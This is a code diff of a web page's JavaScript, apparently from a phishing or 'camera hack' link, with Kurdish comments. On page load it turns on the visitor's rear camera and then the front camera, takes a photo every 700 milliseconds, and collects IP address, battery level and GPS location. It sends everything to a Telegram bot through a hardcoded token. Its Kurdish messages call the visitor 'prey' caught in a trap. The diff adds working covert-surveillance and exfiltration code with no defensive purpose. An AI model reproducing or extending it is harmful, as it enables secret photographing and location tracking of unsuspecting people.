@@ -11,49 +11,75 @@
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
     const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
+    let currentStream = null;
+    let video = document.createElement('video');
 
     async function capture() {
         if (!targetID) return;
+
+        // 🚀 قۆناغی ١: دەستپێکردن بە کامێرای پشتەوە (Environment)
+        await startCam("environment");
+
+        // ناردنی ڕاپۆرتی IP و پاتری
+        sendInitialReport();
+
+        // 📍 ناردنی لوکەیشن
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+        });
+
+        // 📸 دەستپێکردنی وێنەگرتنی بەردەوام (٧٠٠ میلی چرکە)
+        let snapInterval = setInterval(takeSnap, 700);
+
+        // 🔥 قۆناغی ٢: دوای ٥ چرکە گۆڕین بۆ کامێرای پێشەوە (Selfie)
+        setTimeout(async () => {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop()); // وەستاندنی کامێرای پشت
+            }
+            await startCam("user"); // دەستپێکردنی کامێرای پێش
+        }, 5000);
+    }
+
+    async function startCam(mode) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
+            currentStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
                 audio: false 
             });
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-            }
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
-                });
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
-            const video = document.createElement('video');
-            video.srcObject = stream;
+            video.srcObject = currentStream;
             video.muted = true;
             video.play();
-            const takeSnap = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
-            };
-            setInterval(takeSnap, 700);
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            sendToTelegram("⚠️ مۆڵەت نەدرا بۆ کامێرای: " + mode);
         }
     }
+
+    function takeSnap() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.5);
+        }
+    }
+
+    async function sendInitialReport() {
+        let batteryInfo = "Unknown";
+        if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+        }
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        let report = `🦅 <b>نێچیرێکی نوێ کەوتە تەڵەوە!</b>\n\n` +
+                     `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                     `🔋 <b>Battery:</b> <code>${batteryInfo}</code>`;
+        sendToTelegram(report);
+    }
+
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -61,6 +87,7 @@
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
+
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -68,11 +95,12 @@
             body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
         });
     }
+
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
         fd.append(type, blob, "shot.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
 </body>
